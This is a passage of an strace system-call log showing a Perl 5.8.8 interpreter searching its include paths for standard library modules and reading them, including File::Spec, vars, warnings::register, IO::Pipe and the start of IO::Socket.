my($fh, $layer) = @_;\n\n    return binmode $$fh unless $layer;\n    return binmode $$fh, $layer;\n}\n\n1;\n", 4096) = 1784
19001 12:57:07.407830 stat64("/etc/perl/File/Spec.pmc", 0xbf8e398c) = -1 ENOENT (No such file or directory)
19001 12:57:07.407847 stat64("/etc/perl/File/Spec.pm", 0xbf8e389c) = -1 ENOENT (No such file or directory)
19001 12:57:07.407860 stat64("/usr/local/lib/perl/5.8.8/File/Spec.pmc", 0xbf8e398c) = -1 ENOENT (No such file or directory)
19001 12:57:07.407873 stat64("/usr/local/lib/perl/5.8.8/File/Spec.pm", 0xbf8e389c) = -1 ENOENT (No such file or directory)
19001 12:57:07.407887 stat64("/usr/local/share/perl/5.8.8/File/Spec.pmc", 0xbf8e398c) = -1 ENOENT (No such file or directory)
19001 12:57:07.407900 stat64("/usr/local/share/perl/5.8.8/File/Spec.pm", 0xbf8e389c) = -1 ENOENT (No such file or directory)
19001 12:57:07.407915 stat64("/usr/lib/perl5/File/Spec.pmc", 0xbf8e398c) = -1 ENOENT (No such file or directory)
19001 12:57:07.407927 stat64("/usr/lib/perl5/File/Spec.pm", 0xbf8e389c) = -1 ENOENT (No such file or directory)
19001 12:57:07.407940 stat64("/usr/share/perl5/File/Spec.pmc", 0xbf8e398c) = -1 ENOENT (No such file or directory)
19001 12:57:07.407952 stat64("/usr/share/perl5/File/Spec.pm", 0xbf8e389c) = -1 ENOENT (No such file or directory)
19001 12:57:07.407966 stat64("/usr/lib/perl/5.8/File/Spec.pmc", 0xbf8e398c) = -1 ENOENT (No such file or directory)
19001 12:57:07.407978 stat64("/usr/lib/perl/5.8/File/Spec.pm", 0xbf8e389c) = -1 ENOENT (No such file or directory)
19001 12:57:07.407992 stat64("/usr/share/perl/5.8/File/Spec.pmc", 0xbf8e398c) = -1 ENOENT (No such file or directory)
19001 12:57:07.408006 stat64("/usr/share/perl/5.8/File/Spec.pm", {st_mode=S_IFREG|0644, st_size=595, ...}) = 0
19001 12:57:07.408027 open("/usr/share/perl/5.8/File/Spec.pm", O_RDONLY|O_LARGEFILE) = 9
19001 12:57:07.408042 ioctl(9, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf8e36a8) = -1 ENOTTY (Inappropriate ioctl for device)
19001 12:57:07.408053 _llseek(9, 0, [0], SEEK_CUR) = 0
19001 12:57:07.408072 read(9, "package File::Spec;\n\nuse strict;\nuse vars qw(@ISA $VERSION);\n\n$VERSION = \'3.12\';\n$VERSION = eval $VERSION;\n\nmy %module = (MacOS   => \'Mac\',\n\t      MSWin32 => \'Win32\',\n\t      os2     => \'OS2\',\n\t      VMS     => \'VMS\',\n\t      epoc    => \'Epoc\',\n\t      NetWare => \'Win32\', # Yes, File::Spec::Win32 works on NetWare.\n\t      symbian => \'Win32\', # Yes, File::Spec::Win32 works on symbian.\n\t      dos     => \'OS2\',   # Yes, File::Spec::OS2 works on DJGPP.\n\t      cygwin  => \'Cygwin\');\n\nmy $module = $module{$^O} || \'Unix\';\n\nrequire \"File/Spec/$module.pm\";\n@ISA = (\"File::Spec::$module\");\n\n1;\n\n__END__\n\n", 4096) = 595
19001 12:57:07.408162 stat64("/etc/perl/vars.pmc", 0xbf8e34dc) = -1 ENOENT (No such file or directory)
19001 12:57:07.408178 stat64("/etc/perl/vars.pm", 0xbf8e33ec) = -1 ENOENT (No such file or directory)
19001 12:57:07.408191 stat64("/usr/local/lib/perl/5.8.8/vars.pmc", 0xbf8e34dc) = -1 ENOENT (No such file or directory)
19001 12:57:07.408204 stat64("/usr/local/lib/perl/5.8.8/vars.pm", 0xbf8e33ec) = -1 ENOENT (No such file or directory)
19001 12:57:07.408218 stat64("/usr/local/share/perl/5.8.8/vars.pmc", 0xbf8e34dc) = -1 ENOENT (No such file or directory)
19001 12:57:07.408231 stat64("/usr/local/share/perl/5.8.8/vars.pm", 0xbf8e33ec) = -1 ENOENT (No such file or directory)
19001 12:57:07.408246 stat64("/usr/lib/perl5/vars.pmc", 0xbf8e34dc) = -1 ENOENT (No such file or directory)
19001 12:57:07.408258 stat64("/usr/lib/perl5/vars.pm", 0xbf8e33ec) = -1 ENOENT (No such file or directory)
19001 12:57:07.408271 stat64("/usr/share/perl5/vars.pmc", 0xbf8e34dc) = -1 ENOENT (No such file or directory)
19001 12:57:07.408283 stat64("/usr/share/perl5/vars.pm", 0xbf8e33ec) = -1 ENOENT (No such file or directory)
19001 12:57:07.408296 stat64("/usr/lib/perl/5.8/vars.pmc", 0xbf8e34dc) = -1 ENOENT (No such file or directory)
19001 12:57:07.408308 stat64("/usr/lib/perl/5.8/vars.pm", 0xbf8e33ec) = -1 ENOENT (No such file or directory)
19001 12:57:07.408322 stat64("/usr/share/perl/5.8/vars.pmc", 0xbf8e34dc) = -1 ENOENT (No such file or directory)
19001 12:57:07.408334 stat64("/usr/share/perl/5.8/vars.pm", {st_mode=S_IFREG|0644, st_size=1149, ...}) = 0
19001 12:57:07.408355 open("/usr/share/perl/5.8/vars.pm", O_RDONLY|O_LARGEFILE) = 10
19001 12:57:07.408370 ioctl(10, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf8e31f8) = -1 ENOTTY (Inappropriate ioctl for device)
19001 12:57:07.408381 _llseek(10, 0, [0], SEEK_CUR) = 0
19001 12:57:07.408398 read(10, "package vars;\n\nuse 5.006;\n\nour $VERSION = \'1.01\';\n\nuse warnings::register;\nuse strict qw(vars subs);\n\nsub import {\n    my $callpack = caller;\n    my ($pack, @imports) = @_;\n    my ($sym, $ch);\n    foreach (@imports) {\n        if (($ch, $sym) = /^([\\$\\@\\%\\*\\&])(.+)/) {\n\t    if ($sym =~ /\\W/) {\n\t\t# time for a more-detailed check-up\n\t\tif ($sym =~ /^\\w+[[{].*[]}]$/) {\n\t\t    require Carp;\n\t\t    Carp::croak(\"Can\'t declare individual elements of hash or array\");\n\t\t} elsif (warnings::enabled() and length($sym) == 1 and $sym !~ tr/a-zA-Z//) {\n\t\t    warnings::warn(\"No need to declare built-in vars\");\n\t\t} elsif  (($^H &= strict::bits(\'vars\'))) {\n\t\t    require Carp;\n\t\t    Carp::croak(\"\'$_\' is not a valid variable name under strict vars\");\n\t\t}\n\t    }\n\t    $sym = \"${callpack}::$sym\" unless $sym =~ /::/;\n\t    *$sym =\n\t\t(  $ch eq \"\\$\" ? \\$$sym\n\t\t : $ch eq \"\\@\" ? \\@$sym\n\t\t : $ch eq \"\\%\" ? \\%$sym\n\t\t : $ch eq \"\\*\" ? \\*$sym\n\t\t : $ch eq \"\\&\" ? \\&$sym \n\t\t : do {\n\t\t     require Carp;\n\t\t     Carp::croak(\"\'$_\' is not a valid variable name\");\n\t\t });\n\t} else {\n\t    require Carp;\n\t    Carp::croak(\"\'$_\' is not a valid variable name\");\n\t}\n    }\n};\n\n1;\n__END__\n\n", 4096) = 1149
19001 12:57:07.408513 stat64("/etc/perl/warnings/register.pmc", 0xbf8e302c) = -1 ENOENT (No such file or directory)
19001 12:57:07.408528 stat64("/etc/perl/warnings/register.pm", 0xbf8e2f3c) = -1 ENOENT (No such file or directory)
19001 12:57:07.408542 stat64("/usr/local/lib/perl/5.8.8/warnings/register.pmc", 0xbf8e302c) = -1 ENOENT (No such file or directory)
19001 12:57:07.408555 stat64("/usr/local/lib/perl/5.8.8/warnings/register.pm", 0xbf8e2f3c) = -1 ENOENT (No such file or directory)
19001 12:57:07.408569 stat64("/usr/local/share/perl/5.8.8/warnings/register.pmc", 0xbf8e302c) = -1 ENOENT (No such file or directory)
19001 12:57:07.408587 stat64("/usr/local/share/perl/5.8.8/warnings/register.pm", 0xbf8e2f3c) = -1 ENOENT (No such file or directory)
19001 12:57:07.408602 stat64("/usr/lib/perl5/warnings/register.pmc", 0xbf8e302c) = -1 ENOENT (No such file or directory)
19001 12:57:07.408614 stat64("/usr/lib/perl5/warnings/register.pm", 0xbf8e2f3c) = -1 ENOENT (No such file or directory)
19001 12:57:07.408628 stat64("/usr/share/perl5/warnings/register.pmc", 0xbf8e302c) = -1 ENOENT (No such file or directory)
19001 12:57:07.408656 stat64("/usr/share/perl5/warnings/register.pm", 0xbf8e2f3c) = -1 ENOENT (No such file or directory)
19001 12:57:07.408704 stat64("/usr/lib/perl/5.8/warnings/register.pmc", 0xbf8e302c) = -1 ENOENT (No such file or directory)
19001 12:57:07.408735 stat64("/usr/lib/perl/5.8/warnings/register.pm", 0xbf8e2f3c) = -1 ENOENT (No such file or directory)
19001 12:57:07.408749 stat64("/usr/share/perl/5.8/warnings/register.pmc", 0xbf8e302c) = -1 ENOENT (No such file or directory)
19001 12:57:07.408763 stat64("/usr/share/perl/5.8/warnings/register.pm", {st_mode=S_IFREG|0644, st_size=732, ...}) = 0
19001 12:57:07.408784 open("/usr/share/perl/5.8/warnings/register.pm", O_RDONLY|O_LARGEFILE) = 11
19001 12:57:07.408800 ioctl(11, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf8e2d48) = -1 ENOTTY (Inappropriate ioctl for device)
19001 12:57:07.408811 _llseek(11, 0, [0], SEEK_CUR) = 0
19001 12:57:07.408830 read(11, "package warnings::register;\n\nour $VERSION = \'1.01\';\n\nrequire warnings;\n\nsub mkMask\n{\n    my ($bit) = @_;\n    my $mask = \"\";\n\n    vec($mask, $bit, 1) = 1;\n    return $mask;\n}\n\nsub import\n{\n    shift;\n    my $package = (caller(0))[0];\n    if (! defined $warnings::Bits{$package}) {\n        $warnings::Bits{$package}     = mkMask($warnings::LAST_BIT);\n        vec($warnings::Bits{\'all\'}, $warnings::LAST_BIT, 1) = 1;\n        $warnings::Offsets{$package}  = $warnings::LAST_BIT ++;\n\tforeach my $k (keys %warnings::Bits) {\n\t    vec($warnings::Bits{$k}, $warnings::LAST_BIT, 1) = 0;\n\t}\n        $warnings::DeadBits{$package} = mkMask($warnings::LAST_BIT);\n        vec($warnings::DeadBits{\'all\'}, $warnings::LAST_BIT++, 1) = 1;\n    }\n}\n\n1;\n", 4096) = 732
19001 12:57:07.408981 read(11, "", 4096) = 0
19001 12:57:07.408995 close(11)         = 0
19001 12:57:07.409210 _llseek(10, 1148, [1148], SEEK_SET) = 0
19001 12:57:07.409227 _llseek(10, 0, [1148], SEEK_CUR) = 0
19001 12:57:07.409238 close(10)         = 0
19001 12:57:07.409308 _llseek(9, 594, [594], SEEK_SET) = 0
19001 12:57:07.409323 _llseek(9, 0, [594], SEEK_CUR) = 0
19001 12:57:07.409333 close(9)          = 0
19001 12:57:07.409367 stat64("/etc/perl/File/Spec/Unix.pmc", 0xbf8e398c) = -1 ENOENT (No such file or directory)
19001 12:57:07.409382 stat64("/etc/perl/File/Spec/Unix.pm", 0xbf8e389c) = -1 ENOENT (No such file or directory)
19001 12:57:07.409397 stat64("/usr/local/lib/perl/5.8.8/File/Spec/Unix.pmc", 0xbf8e398c) = -1 ENOENT (No such file or directory)
19001 12:57:07.409410 stat64("/usr/local/lib/perl/5.8.8/File/Spec/Unix.pm", 0xbf8e389c) = -1 ENOENT (No such file or directory)
19001 12:57:07.409425 stat64("/usr/local/share/perl/5.8.8/File/Spec/Unix.pmc", 0xbf8e398c) = -1 ENOENT (No such file or directory)
19001 12:57:07.409438 stat64("/usr/local/share/perl/5.8.8/File/Spec/Unix.pm", 0xbf8e389c) = -1 ENOENT (No such file or directory)
19001 12:57:07.409452 stat64("/usr/lib/perl5/File/Spec/Unix.pmc", 0xbf8e398c) = -1 ENOENT (No such file or directory)
19001 12:57:07.409465 stat64("/usr/lib/perl5/File/Spec/Unix.pm", 0xbf8e389c) = -1 ENOENT (No such file or directory)
19001 12:57:07.409479 stat64("/usr/share/perl5/File/Spec/Unix.pmc", 0xbf8e398c) = -1 ENOENT (No such file or directory)
19001 12:57:07.409491 stat64("/usr/share/perl5/File/Spec/Unix.pm", 0xbf8e389c) = -1 ENOENT (No such file or directory)
19001 12:57:07.409505 stat64("/usr/lib/perl/5.8/File/Spec/Unix.pmc", 0xbf8e398c) = -1 ENOENT (No such file or directory)
19001 12:57:07.409518 stat64("/usr/lib/perl/5.8/File/Spec/Unix.pm", 0xbf8e389c) = -1 ENOENT (No such file or directory)
19001 12:57:07.409537 stat64("/usr/share/perl/5.8/File/Spec/Unix.pmc", 0xbf8e398c) = -1 ENOENT (No such file or directory)
19001 12:57:07.409551 stat64("/usr/share/perl/5.8/File/Spec/Unix.pm", {st_mode=S_IFREG|0644, st_size=7038, ...}) = 0
19001 12:57:07.409573 open("/usr/share/perl/5.8/File/Spec/Unix.pm", O_RDONLY|O_LARGEFILE) = 9
19001 12:57:07.409588 ioctl(9, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf8e36a8) = -1 ENOTTY (Inappropriate ioctl for device)
19001 12:57:07.409600 _llseek(9, 0, [0], SEEK_CUR) = 0
19001 12:57:07.409618 read(9, "package File::Spec::Unix;\n\nuse strict;\nuse vars qw($VERSION);\n\n$VERSION = \'1.5\';\n\nsub canonpath {\n    my ($self,$path) = @_;\n    \n    # Handle POSIX-style node names beginning with double slash (qnx, nto)\n    # Handle network path names beginning with double slash (cygwin)\n    # (POSIX says: \"a pathname that begins with two successive slashes\n    # may be interpreted in an implementation-defined manner, although\n    # more than two leading slashes shall be treated as a single slash.\")\n    my $node = \'\';\n    if ( $^O =~ m/^(?:qnx|nto|cygwin)$/ && $path =~ s:^(//[^/]+)(/|\\z):/:s ) {\n      $node = $1;\n    }\n    # This used to be\n    # $path =~ s|/+|/|g unless($^O eq \'cygwin\');\n    # but that made tests 29, 30, 35, 46, and 213 (as of #13272) to fail\n    # (Mainly because trailing \"\" directories didn\'t get stripped).\n    # Why would cygwin avoid collapsing multiple slashes into one? --jhi\n    $path =~ s|/+|/|g;                             # xx////xx  -> xx/xx\n    $path =~ s@(/\\.)+(/|\\Z(?!\\n))@/@g;             # xx/././xx -> xx/xx\n    $path =~ s|^(\\./)+||s unless $path eq \"./\";    # ./xx      -> xx\n    $path =~ s|^/(\\.\\./)+|/|;                      # /../../xx -> xx\n    $path =~ s|^/\\.\\.$|/|;                         # /..       -> /\n    $path =~ s|/\\Z(?!\\n)|| unless $path eq \"/\";          # xx/       -> xx\n    return \"$node$path\";\n}\n\nsub catdir {\n    my $self = shift;\n\n    $self->canonpath(join(\'/\', @_, \'\')); # \'\' because need a trailing \'/\'\n}\n\nsub catfile {\n    my $self = shift;\n    my $file = $self->canonpath(pop @_);\n    return $file unless @_;\n    my $dir = $self->catdir(@_);\n    $dir .= \"/\" unless substr($dir,-1) eq \"/\";\n    return $dir.$file;\n}\n\nsub curdir () { \'.\' }\n\nsub devnull () { \'/dev/null\' }\n\nsub rootdir () { \'/\' }\n\nmy $tmpdir;\nsub _tmpdir {\n    return $tmpdir if defined $tmpdir;\n    my $self = shift;\n    my @dirlist = @_;\n    {\n\tno strict \'refs\';\n\tif (${\"\\cTAINT\"}) { # Check for taint mode on perl >= 5.8.0\n            require Scalar::Util;\n\t    @dirlist = grep { ! Scalar::Util::tainted($_) } @dirlist;\n\t}\n    }\n    foreach (@dirlist) {\n\tnext unless defined && -d && -w _;\n\t$tmpdir = $_;\n\tlast;\n    }\n    $tmpdir = $self->curdir unless defined $tmpdir;\n    $tmpdir = defined $tmpdir && $self->canonpath($tmpdir);\n    return $tmpdir;\n}\n\nsub tmpdir {\n    return $tmpdir if defined $tmpdir;\n    $tmpdir = $_[0]->_tmpdir( $ENV{TMPDIR}, \"/tmp\" );\n}\n\nsub updir () { \'..\' }\n\nsub no_upwards {\n    my $self = shift;\n    return grep(!/^\\.{1,2}\\Z(?!\\n)/s, @_);\n}\n\nsub case_tolerant () { 0 }\n\nsub file_name_is_absolute {\n    my ($self,$file) = @_;\n    return scalar($file =~ m:^/:s);\n}\n\nsub path {\n    return () unless exists $ENV{PATH};\n    my @path = split(\':\', $ENV{PATH});\n    foreach (@path) { $_ = \'.\' if $_ eq \'\' }\n    return @path;\n}\n\nsub join {\n    my $self = shift;\n    return $self->catfile(@_);\n}\n\nsub splitpath {\n    my ($self,$path, $nofile) = @_;\n\n    my ($volume,$directory,$file) = (\'\',\'\',\'\');\n\n    if ( $nofile ) {\n        $directory = $path;\n    }\n    else {\n        $path =~ m|^ ( (?: .* / (?: \\.\\.?\\Z(?!\\n) )? )? ) ([^/]*) |xs;\n        $directory = $1;\n        $file      = $2;\n    }\n\n    return ($volume,$directory,$file);\n}\n\nsub splitdir {\n    return split m|/|, $_[1], -1;  # Preserve trailing fields\n}\n\nsub catpath {\n    my ($self,$volume,$directory,$file) = @_;\n\n    if ( $directory ne \'\'                && \n         $file ne \'\'                     && \n         substr( $directory, -1 ) ne \'/\' && \n         substr( $file, 0, 1 ) ne \'/\' \n    ) {\n        $directory .= \"/$file\" ;\n    }\n    else {\n        $directory .= $file ;\n    }\n\n    return $directory ;\n}\n\nsub abs2rel {\n    my($self,$path,$base) = @_;\n\n    # Figure out the effective $base and clean it up.\n    if ( !defined( $base ) || $base eq \'\' ) {\n        $base = $self->_cwd();\n    }\n    elsif ( ! $self->file_name_is_absolute( $base ) ) {\n\tif ( ! $self->file_name_is_absolute( $path ) ) {\n\t    # optimisation where both paths are relative: save 2 x cwd\n\t    $base = $self->canonpath( \"/$base\" );\n\t    $path = \"/$path\";\n\t}\n\telse {\n\t    $base = $self->rel2abs( $base ) ;\n\t}\n    }\n  ", 4096) = 4096
19001 12:57:07.410316 brk(0x8218000)    = 0x8218000
19001 12:57:07.410454 read(9, "  else {\n        $base = $self->canonpath( $base ) ;\n    }\n\n    # Clean up $path\n    if ( ! $self->file_name_is_absolute( $path ) ) {\n        $path = $self->rel2abs( $path ) ;\n    }\n    else {\n        $path = $self->canonpath( $path ) ;\n    }\n\n    # Now, remove all leading components that are the same\n    my @pathchunks = $self->splitdir( $path);\n    my @basechunks = $self->splitdir( $base);\n\n    while (@pathchunks && @basechunks && $pathchunks[0] eq $basechunks[0]) {\n        shift @pathchunks ;\n        shift @basechunks ;\n    }\n\n    $path = CORE::join( \'/\', @pathchunks );\n    $base = CORE::join( \'/\', @basechunks );\n\n    # $base now contains the directories the resulting relative path \n    # must ascend out of before it can descend to $path_directory.  So, \n    # replace all names with $parentDir\n    $base =~ s|[^/]+|..|g ;\n\n    # Glue the two together, using a separator if necessary, and preventing an\n    # empty result.\n    if ( $path ne \'\' && $base ne \'\' ) {\n        $path = \"$base/$path\" ;\n    } else {\n        $path = \"$base$path\" ;\n    }\n\n    return $self->canonpath( $path ) ;\n}\n\nsub rel2abs {\n    my ($self,$path,$base ) = @_;\n\n    # Clean up $path\n    if ( ! $self->file_name_is_absolute( $path ) ) {\n        # Figure out the effective $base and clean it up.\n        if ( !defined( $base ) || $base eq \'\' ) {\n\t    $base = $self->_cwd();\n        }\n        elsif ( ! $self->file_name_is_absolute( $base ) ) {\n            $base = $self->rel2abs( $base ) ;\n        }\n        else {\n            $base = $self->canonpath( $base ) ;\n        }\n\n        # Glom them together\n        $path = $self->catdir( $base, $path ) ;\n    }\n\n    return $self->canonpath( $path ) ;\n}\n\n# Internal routine to File::Spec, no point in making this public since\n# it is the standard Cwd interface.  Most of the platform-specific\n# File::Spec subclasses use this.\nsub _cwd {\n    require Cwd;\n    Cwd::cwd();\n}\n\n# Internal method to reduce xx\\..\\yy -> yy\nsub _collapse {\n    my($fs, $path) = @_;\n\n    my $updir  = $fs->updir;\n    my $curdir = $fs->curdir;\n\n    my($vol, $dirs, $file) = $fs->splitpath($path);\n    my @dirs = $fs->splitdir($dirs);\n\n    my @collapsed;\n    foreach my $dir (@dirs) {\n        if( $dir eq $updir              and   # if we have an updir\n            @collapsed                  and   # and something to collapse\n            length $collapsed[-1]       and   # and its not the rootdir\n            $collapsed[-1] ne $updir    and   # nor another updir\n            $collapsed[-1] ne $curdir         # nor the curdir\n          ) \n        {                                     # then\n            pop @collapsed;                   # collapse\n        }\n        else {                                # else\n            push @collapsed, $dir;            # just hang onto it\n        }\n    }\n\n    return $fs->catpath($vol,\n                        $fs->catdir(@collapsed),\n                        $file\n                       );\n}\n\n1;\n", 4096) = 2942
19001 12:57:07.410919 read(9, "", 4096) = 0
19001 12:57:07.410938 close(9)          = 0
19001 12:57:07.411133 read(7, "", 4096) = 0
19001 12:57:07.411148 close(7)          = 0
19001 12:57:07.411366 stat64("/etc/perl/IO/Pipe.pmc", 0xbf8e3e3c) = -1 ENOENT (No such file or directory)
19001 12:57:07.411385 stat64("/etc/perl/IO/Pipe.pm", 0xbf8e3d4c) = -1 ENOENT (No such file or directory)
19001 12:57:07.411400 stat64("/usr/local/lib/perl/5.8.8/IO/Pipe.pmc", 0xbf8e3e3c) = -1 ENOENT (No such file or directory)
19001 12:57:07.411413 stat64("/usr/local/lib/perl/5.8.8/IO/Pipe.pm", 0xbf8e3d4c) = -1 ENOENT (No such file or directory)
19001 12:57:07.411428 stat64("/usr/local/share/perl/5.8.8/IO/Pipe.pmc", 0xbf8e3e3c) = -1 ENOENT (No such file or directory)
19001 12:57:07.411441 stat64("/usr/local/share/perl/5.8.8/IO/Pipe.pm", 0xbf8e3d4c) = -1 ENOENT (No such file or directory)
19001 12:57:07.411455 stat64("/usr/lib/perl5/IO/Pipe.pmc", 0xbf8e3e3c) = -1 ENOENT (No such file or directory)
19001 12:57:07.411467 stat64("/usr/lib/perl5/IO/Pipe.pm", 0xbf8e3d4c) = -1 ENOENT (No such file or directory)
19001 12:57:07.411481 stat64("/usr/share/perl5/IO/Pipe.pmc", 0xbf8e3e3c) = -1 ENOENT (No such file or directory)
19001 12:57:07.411493 stat64("/usr/share/perl5/IO/Pipe.pm", 0xbf8e3d4c) = -1 ENOENT (No such file or directory)
19001 12:57:07.411506 stat64("/usr/lib/perl/5.8/IO/Pipe.pmc", 0xbf8e3e3c) = -1 ENOENT (No such file or directory)
19001 12:57:07.411520 stat64("/usr/lib/perl/5.8/IO/Pipe.pm", {st_mode=S_IFREG|0644, st_size=3426, ...}) = 0
19001 12:57:07.411542 open("/usr/lib/perl/5.8/IO/Pipe.pm", O_RDONLY|O_LARGEFILE) = 7
19001 12:57:07.411558 ioctl(7, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf8e3b58) = -1 ENOTTY (Inappropriate ioctl for device)
19001 12:57:07.411569 _llseek(7, 0, [0], SEEK_CUR) = 0
19001 12:57:07.411590 read(7, "# IO::Pipe.pm\n#\n# Copyright (c) 1996-8 Graham Barr <gbarr@pobox.com>. All rights reserved.\n# This program is free software; you can redistribute it and/or\n# modify it under the same terms as Perl itself.\n\npackage IO::Pipe;\n\nuse 5.006_001;\n\nuse IO::Handle;\nuse strict;\nour($VERSION);\nuse Carp;\nuse Symbol;\n\n$VERSION = \"1.13\";\n\nsub new {\n    my $type = shift;\n    my $class = ref($type) || $type || \"IO::Pipe\";\n    @_ == 0 || @_ == 2 or croak \"usage: new $class [READFH, WRITEFH]\";\n\n    my $me = bless gensym(), $class;\n\n    my($readfh,$writefh) = @_ ? @_ : $me->handles;\n\n    pipe($readfh, $writefh)\n\tor return undef;\n\n    @{*$me} = ($readfh, $writefh);\n\n    $me;\n}\n\nsub handles {\n    @_ == 1 or croak \'usage: $pipe->handles()\';\n    (IO::Pipe::End->new(), IO::Pipe::End->new());\n}\n\nmy $do_spawn = $^O eq \'os2\' || $^O eq \'MSWin32\';\n\nsub _doit {\n    my $me = shift;\n    my $rw = shift;\n\n    my $pid = $do_spawn ? 0 : fork();\n\n    if($pid) { # Parent\n        return $pid;\n    }\n    elsif(defined $pid) { # Child or spawn\n        my $fh;\n        my $io = $rw ? \\*STDIN : \\*STDOUT;\n        my ($mode, $save) = $rw ? \"r\" : \"w\";\n        if ($do_spawn) {\n          require Fcntl;\n          $save = IO::Handle->new_from_fd($io, $mode);\n\t  my $handle = shift;\n          # Close in child:\n\t  unless ($^O eq \'MSWin32\') {\n            fcntl($handle, Fcntl::F_SETFD(), 1) or croak \"fcntl: $!\";\n\t  }\n          $fh = $rw ? ${*$me}[0] : ${*$me}[1];\n        } else {\n          shift;\n          $fh = $rw ? $me->reader() : $me->writer(); # close the other end\n        }\n        bless $io, \"IO::Handle\";\n        $io->fdopen($fh, $mode);\n\t$fh->close;\n\n        if ($do_spawn) {\n          $pid = eval { system 1, @_ }; # 1 == P_NOWAIT\n          my $err = $!;\n    \n          $io->fdopen($save, $mode);\n          $save->close or croak \"Cannot close $!\";\n          croak \"IO::Pipe: Cannot spawn-NOWAIT: $err\" if not $pid or $pid < 0;\n          return $pid;\n        } else {\n          exec @_ or\n            croak \"IO::Pipe: Cannot exec: $!\";\n        }\n    }\n    else {\n        croak \"IO::Pipe: Cannot fork: $!\";\n    }\n\n    # NOT Reached\n}\n\nsub reader {\n    @_ >= 1 or croak \'usage: $pipe->reader( [SUB_COMMAND_ARGS] )\';\n    my $me = shift;\n\n    return undef\n\tunless(ref($me) || ref($me = $me->new));\n\n    my $fh  = ${*$me}[0];\n    my $pid;\n    $pid = $me->_doit(0, $fh, @_)\n        if(@_);\n\n    close ${*$me}[1];\n    bless $me, ref($fh);\n    *$me = *$fh;          # Alias self to handle\n    $me->fdopen($fh->fileno,\"r\")\n\tunless defined($me->fileno);\n    bless $fh;                  # Really wan\'t un-bless here\n    ${*$me}{\'io_pipe_pid\'} = $pid\n        if defined $pid;\n\n    $me;\n}\n\nsub writer {\n    @_ >= 1 or croak \'usage: $pipe->writer( [SUB_COMMAND_ARGS] )\';\n    my $me = shift;\n\n    return undef\n\tunless(ref($me) || ref($me = $me->new));\n\n    my $fh  = ${*$me}[1];\n    my $pid;\n    $pid = $me->_doit(1, $fh, @_)\n        if(@_);\n\n    close ${*$me}[0];\n    bless $me, ref($fh);\n    *$me = *$fh;          # Alias self to handle\n    $me->fdopen($fh->fileno,\"w\")\n\tunless defined($me->fileno);\n    bless $fh;                  # Really wan\'t un-bless here\n    ${*$me}{\'io_pipe_pid\'} = $pid\n        if defined $pid;\n\n    $me;\n}\n\npackage IO::Pipe::End;\n\nour(@ISA);\n\n@ISA = qw(IO::Handle);\n\nsub close {\n    my $fh = shift;\n    my $r = $fh->SUPER::close(@_);\n\n    waitpid(${*$fh}{\'io_pipe_pid\'},0)\n\tif(defined ${*$fh}{\'io_pipe_pid\'});\n\n    $r;\n}\n\n1;\n\n__END__\n\n", 4096) = 3426
19001 12:57:07.412335 _llseek(7, 3425, [3425], SEEK_SET) = 0
19001 12:57:07.412369 _llseek(7, 0, [3425], SEEK_CUR) = 0
19001 12:57:07.412380 close(7)          = 0
19001 12:57:07.412405 stat64("/etc/perl/IO/Socket.pmc", 0xbf8e3e3c) = -1 ENOENT (No such file or directory)
19001 12:57:07.412419 stat64("/etc/perl/IO/Socket.pm", 0xbf8e3d4c) = -1 ENOENT (No such file or directory)
19001 12:57:07.412433 stat64("/usr/local/lib/perl/5.8.8/IO/Socket.pmc", 0xbf8e3e3c) = -1 ENOENT (No such file or directory)
19001 12:57:07.412446 stat64("/usr/local/lib/perl/5.8.8/IO/Socket.pm", 0xbf8e3d4c) = -1 ENOENT (No such file or directory)
19001 12:57:07.412461 stat64("/usr/local/share/perl/5.8.8/IO/Socket.pmc", 0xbf8e3e3c) = -1 ENOENT (No such file or directory)
19001 12:57:07.412474 stat64("/usr/local/share/perl/5.8.8/IO/Socket.pm", 0xbf8e3d4c) = -1 ENOENT (No such file or directory)
19001 12:57:07.412488 stat64("/usr/lib/perl5/IO/Socket.pmc", 0xbf8e3e3c) = -1 ENOENT (No such file or directory)
19001 12:57:07.412501 stat64("/usr/lib/perl5/IO/Socket.pm", 0xbf8e3d4c) = -1 ENOENT (No such file or directory)
19001 12:57:07.412514 stat64("/usr/share/perl5/IO/Socket.pmc", 0xbf8e3e3c) = -1 ENOENT (No such file or directory)
19001 12:57:07.412526 stat64("/usr/share/perl5/IO/Socket.pm", 0xbf8e3d4c) = -1 ENOENT (No such file or directory)
19001 12:57:07.412539 stat64("/usr/lib/perl/5.8/IO/Socket.pmc", 0xbf8e3e3c) = -1 ENOENT (No such file or directory)
19001 12:57:07.412552 stat64("/usr/lib/perl/5.8/IO/Socket.pm", {st_mode=S_IFREG|0644, st_size=6699, ...}) = 0
19001 12:57:07.412574 open("/usr/lib/perl/5.8/IO/Socket.pm", O_RDONLY|O_LARGEFILE) = 7
19001 12:57:07.412589 ioctl(7, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf8e3b58) = -1 ENOTTY (Inappropriate ioctl for device)
19001 12:57:07.412600 _llseek(7, 0, [0], SEEK_CUR) = 0
19001 12:57:07.412618 read(7, "# IO::Socket.pm\n#\n# Copyright (c) 1997-8 Graham Barr <gbarr@pobox.com>. All rights reserved.\n# This program is free software; you can redistribute it and/or\n# modify it under the same terms as Perl itself.\n\npackage IO::Socket;\n\nrequire 5.006;\n\nuse IO::Handle;\nuse Socket 1.3;\nuse Carp;\nuse strict;\nour(@ISA, $VERSION, @EXPORT_OK);\nuse Exporter;\nuse Errno;\n\n# legacy\n\nrequire IO::Socket::INET;\nrequire IO::Socket::UNIX if ($^O ne \'epoc\' && $^O ne \'symbian\');\n\n@ISA = qw(IO::Handle);\n\n$VERSION = \"1.29\";\n\n@EXPORT_OK = qw(sockatmark);\n\nsub import {\n    my $pkg = shift;\n    if (@_ && $_[0] eq \'sockatmark\') { # not very extensible but for now, fast\n\tExporter::export_to_level(\'IO::Socket\', 1, $pkg, \'sockatmark\');\n    } else {\n\tmy $callpkg = caller;\n\tExporter::export \'Socket\', $callpkg, @_;\n    }\n}\n\nsub new {\n    my($class,%arg) = @_;\n    my $sock = $class->SUPER::new();\n\n    $sock->autoflush(1);\n\n    ${*$sock}{\'io_socket_timeout\'} = delete $arg{Timeout};\n\n    return scalar(%arg) ? $sock->configure(\\%arg)\n\t\t\t: $sock;\n}\n\nmy @domain2pkg;\n\nsub register_domain {\n    my($p,$d) = 